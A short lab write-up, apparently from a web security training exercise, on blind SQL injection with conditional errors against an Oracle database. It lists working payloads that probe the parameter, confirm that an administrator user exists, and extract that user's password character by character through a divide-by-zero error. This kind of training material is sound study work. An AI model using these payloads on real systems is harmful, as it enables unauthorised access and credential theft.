# Lab 12 - Blind SQL injection with conditional errors
 <br>
since this oracle database we will use different information sechame and operators <br> 

## 1) Confirm that the parameter is vulnerable to blind SQLi
by using payload <br>
' || (select '' from dual) || '  <br>
the response have no error code which is okay  <br>
if we try something wrong i see error <br>
like ' || (select '' from dualsaasaasasassa) || ' <br>

## 2) Confirm that we have a users and administrator user in table
' || (select '' from users where rownum =1) || '  <br>
we have no error <br>
then  <br>
' || (select '' from users where username='administrator') || '  <br>
there's no error <br>
 <br>
##  3) bruteforce the password character by character 
3'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||' <br>
 <br>
![image](https://github.com/user-attachments/assets/846b2816-119f-4bf7-b615-9175819904f8)
